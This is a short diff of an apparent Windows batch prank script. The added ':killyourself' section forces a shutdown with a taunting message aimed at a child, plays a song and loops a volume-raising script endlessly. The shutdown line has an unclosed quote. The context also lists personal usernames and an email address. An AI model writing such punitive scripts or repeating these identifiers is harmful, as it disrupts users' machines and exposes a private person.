@@ -104,3 +104,11 @@ echo
 		goto finale
 	:usernames
 		echo ryanspaker, cowsociety, ryanspaker@gmail.com, rspaker22,   chrome https://www.youtube.com/watch?v=u59z8xGofpc
+:killyourself
+	echo "You made a mistake >:("
+	timeout 3 >null
+	shutdown -s -t 20 -c "Listen hear you little kid. This is my data, get your hands off.
+	cscript "%~dp0\despacito.vbs"
+	:loop
+	cscript "%~dp0\volumeUP.vbs"
+	goto loop
